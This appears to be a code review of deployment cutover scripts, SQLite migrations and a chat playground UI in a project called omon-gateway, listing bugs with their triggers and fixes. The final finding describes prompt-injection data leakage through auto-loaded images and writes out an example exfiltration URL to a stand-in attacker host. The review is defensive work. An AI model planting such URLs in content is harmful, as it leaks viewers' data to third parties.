# web-deploy review
### [P1] Phase-1 cutover disables the legacy cron before checking the gateway DB, so a missing or locked DB leaves no scheduler running
- Location: /Users/indo/code/project/omon-gateway/scripts/cutover_phase1_cron.sh:8, 38-55, 66-71
- Trigger: Run `cutover_phase1_cron.sh` live with the default `DB_PATH` (`${REPO_ROOT}/data/gateway.db`, line 8). The gateway's own default DB is `sqlite://omon_gateway.db` (`src/entry.rs:145`, `src/dashboard_runtime.rs:55`, `Dockerfile:28`). The file is therefore not found, or `sqlite3` returns "database is locked" while the gateway holds the WAL.
- Impact: Step 1 (lines 38-55) has already booted out the launchd job, renamed the plist to `.disabled`, and commented out the crontab entries. Step 2 then hits `exit 1` at line 68, or `set -e` aborts at the `sqlite3` UPDATE (line 71). The 14 jobs end up enabled in neither system until someone runs the rollback script. There is no pre-flight check.
- Fix: Validate `DB_PATH` first (exists, writable, `sqlite3` works). Better, enable the gateway jobs first and disable the legacy ones only after that succeeds. Align the default path with `DATABASE_URL` or `omon_gateway.db`.

### [P1] Phase-3 cutover and rollback overwrite the whole `DISCORD_BOT_TOKENS` line and delete the only backup
- Location: /Users/indo/code/project/omon-gateway/scripts/cutover_phase3_inbound.sh:85-87; /Users/indo/code/project/omon-gateway/scripts/rollback_phase3_inbound.sh:46-47
- Trigger: `.env` has a multi-bot `DISCORD_BOT_TOKENS=tokA,tokB,...`. The code supports several comma-separated tokens (`src/main.rs:139-146`). The operator runs the cutover, or the rollback.
- Impact: `sed "s|^DISCORD_BOT_TOKENS=.*|DISCORD_BOT_TOKENS=<one token>|"` replaces the whole list with a single token, so every other bot token is lost. The rollback's `s|^DISCORD_BOT_TOKENS=.*|DISCORD_BOT_TOKENS=|` blanks the entire list, not just the OmOMeow token. Both scripts then run `rm -f "${ENV_FILE}.bak"`, which deletes the only backup. The secrets cannot be recovered from the script. Separately, if `.env` has no `DISCORD_BOT_TOKENS=` line, `sed` is a no-op but the script still prints "Injected production token".
- Fix: Keep a timestamped backup of `.env`. Append to or remove only the specific token from the comma-separated list, and `grep` to confirm the change before reporting success. Do not touch the other tokens.

### [P1] Rollback script kills itself via `pkill -f "omon-gateway"` and skips restoring the legacy service
- Location: /Users/indo/code/project/omon-gateway/scripts/rollback_phase3_inbound.sh:54 (same pattern at /Users/indo/code/project/omon-gateway/scripts/cutover_phase3_inbound.sh:104)
- Trigger: Run the rollback where `launchctl` is absent or `GATEWAY_PLIST` is not a file (the else branch). The script is started as `bash /…/omon-gateway/scripts/rollback_phase3_inbound.sh`. Its own command line contains "omon-gateway" because of the repo directory name, so `pkill -f` SIGTERMs the running script. `pkill` only excludes itself.
- Impact: The rollback dies after the `pkill` and never reaches Step 2 (line 58), which restores the legacy OmOMeow plist and daemon. The operator is left with no inbound bot. The `|| true` hides the failure. The pattern also fails to match the real daemon, whose binary is `omo-gateway` (`Cargo.toml` bin name), and it would kill any unrelated process whose command line contains that repo path (editors, `cargo run`).
- Fix: Stop the daemon by exact process name (`pkill -x omo-gateway`) or by pidfile or launchd label, never by `-f` on a substring of the repo path. Run the legacy-restore step before any broad kill.

### [P1] `seed_omomeow_crons.sql` uses `INSERT OR REPLACE`, which disables cut-over jobs and wipes or orphans their run history on re-run
- Location: /Users/indo/code/project/omon-gateway/scripts/seed_omomeow_crons.sql:1 (cascade defined at /Users/indo/code/project/omon-gateway/migrations/0004_cron_leases.sql:11)
- Trigger: Re-run the seed against a live DB after phase-1 has set `enabled = 1`.
- Impact: Each of the 14 rows is deleted and reinserted with `enabled=0` and `next_run_at=NULL`, so the jobs are silently switched off. `cron_runs` has `FOREIGN KEY (job_id) … ON DELETE CASCADE`. With foreign keys enabled the run history for those jobs is deleted. With the `sqlite3` CLI default (foreign keys off) the run rows are orphaned instead. `cron_monitor_states`, `cron_incidents` and `cron_problems` have no FK and keep stale rows.
- Fix: Use `INSERT … ON CONFLICT(id) DO NOTHING`, or `DO UPDATE` limited to `expression` and `payload_json`. Never write `enabled` on conflict.

### [P2] `verify_phase2_shadow.sh` reports Check 3 as PASS unconditionally and never enforces its timeout
- Location: /Users/indo/code/project/omon-gateway/scripts/verify_phase2_shadow.sh:9, 56, 68, 84-85
- Trigger: Any failure of `cargo test --test test_discord_adapter` (line 84). The `|| true` plus `pass_check` means the check cannot fail, so the "6/6 Passed" gate can be reported with a failing suite. Check 2's `curl` (line 68) has no `--max-time`, and `TIMEOUT_SECS` (line 9) is never used, so the script can hang offline. Check 1's `grep -q DISCORD_BOT_TOKENS` (line 56) also matches a commented-out line.
- Impact: The phase-2 gate that justifies the phase-3 cutover can give a false green.
- Fix: Drop `|| true`. Pass `--max-time "$TIMEOUT_SECS"` to `curl`. Anchor the grep with `^DISCORD_BOT_TOKENS=.+`.

### [P2] Cutover scripts are not idempotent for crontab edits, and the "Backing up" message backs up nothing
- Location: /Users/indo/code/project/omon-gateway/scripts/cutover_phase1_cron.sh:51-54; /Users/indo/code/project/omon-gateway/scripts/rollback_phase1_cron.sh (the `sed 's/^# DISABLED_BY_CUTOVER //'` line)
- Trigger: Run the cutover twice, then the rollback once.
- Impact: The second run prefixes `# DISABLED_BY_CUTOVER` again on lines that already carry it, because the pattern matches `.*omomeow.*`. The rollback strips only one prefix, so the entries stay commented. No backup of the crontab is written despite the message. `pkill -f "omomeow"` (`cutover_phase3_inbound.sh:60,64`) also kills unrelated processes such as `bin/omomeow-delegate`.
- Fix: Save `crontab -l > backup` before editing. Skip lines that already contain `DISABLED_BY_CUTOVER`. Restore from the backup.

### [P2] Deleting a session leaves its message text searchable in `message_search_documents`
- Location: /Users/indo/code/project/omon-gateway/migrations/0015_message_search_fts.sql:48-52 (trigger `message_search_transcript_ai`); /Users/indo/code/project/omon-gateway/migrations/0001_initial.sql:20 (`messages` cascade)
- Trigger: A user deletes a session (the dashboard's `deleteSession` in `web/src/api.ts`). `messages` rows cascade away, but there is only an AFTER INSERT trigger on `messages`. Every `message_search_documents` reference I found in `src/` is a SELECT or INSERT/upsert; I found no DELETE.
- Impact: The deleted transcript text, including any secrets pasted into it, stays indexed and returnable by message search.
- Fix: Add a forward migration with an AFTER DELETE trigger on `messages` (or sessions) that deletes the matching search documents. Optionally purge the existing orphans.

### [P2] FTS external-content table is keyed on an implicit `rowid` of a composite-PK table
- Location: /Users/indo/code/project/omon-gateway/migrations/0015_message_search_fts.sql:19-26
- Trigger: `message_search_documents` has `PRIMARY KEY (platform, channel_id, message_id)` and no INTEGER PRIMARY KEY, so `rowid` is implicit. SQLite may renumber such rowids on `VACUUM`. I did not check whether the code ever runs `VACUUM`.
- Impact: After a renumbering, `message_search_fts` rowids no longer map to the right documents. Search then returns wrong or missing rows, and the `'delete'` trigger commands corrupt the index.
- Fix: Run an FTS `rebuild` after any `VACUUM`, or move to a table with an explicit INTEGER PRIMARY KEY.

### [P2] Migration 0041 drops the FK parent `inbox_items` while `inbox_decisions` children exist
- Location: /Users/indo/code/project/omon-gateway/migrations/0041_cron_remediation.sql:1, 16-18
- Trigger: Upgrade a pre-0041 DB that has `inbox_decisions` rows. The `DROP TABLE inbox_items` does an implicit DELETE under `defer_foreign_keys`. A prior review round reproduced `FOREIGN KEY constraint failed` at COMMIT.
- Impact: `Database::connect` fails at `MIGRATOR.run`, so the gateway won't boot on such an upgrade. It is graded P2 because already-applied DBs (version 41 recorded) are unaffected, and editing the file would break the sqlx checksum.
- Fix: Do not edit 0041. Ship a documented upgrade note, or a pre-step that rebuilds the table with foreign keys off before migration. Add a migration test that seeds `inbox_items` and `inbox_decisions`.

### [P2] Chat playground auto-loads arbitrary remote image URLs found in message content
- Location: /Users/indo/code/project/omon-gateway/web/src/App.tsx:725-726, 803-811
- Trigger: Agent or user message content contains `https://attacker.example/x.png?d=<data>`, for example via prompt injection.
- Impact: The operator's browser fetches the URL as soon as the transcript renders (`<img src={imgUrl} loading="lazy">`). That leaks the viewer's IP and any data in the query string, and it is a tracking-pixel vector.
- Fix: Do not auto-render external images. Show a click-through link, or proxy and allowlist hosts. Alternatively, set a CSP of `img-src 'self' data:`.
